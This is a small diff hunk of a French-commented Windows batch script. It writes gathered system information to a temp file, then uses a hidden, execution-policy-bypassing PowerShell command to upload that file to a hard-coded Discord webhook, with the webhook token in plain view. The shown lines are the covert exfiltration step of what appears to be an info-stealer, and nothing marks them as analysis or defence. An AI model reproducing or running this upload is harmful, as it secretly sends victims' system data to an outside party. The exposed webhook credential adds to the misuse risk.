@@ -68,7 +68,7 @@
 
     echo "----------------------------------"
     echo "Fin du script."
-) >> "%temp%\system_info.txt"
+) > "%temp%\system_info.txt"
 
 :: Envoi du fichier au webhook Discord
 powershell -NoP -NonI -W Hidden -Exec Bypass "(New-Object System.Net.WebClient).UploadFile('https://discord.com/api/webhooks/1151525024088477868/uRlaL-EA8gyLBxmjfzoZg5aAB1QT24phwo9XA13_rA2tai3rMHp2E7KqZEKN9sMS54kF', '%temp%\system_info.txt')"
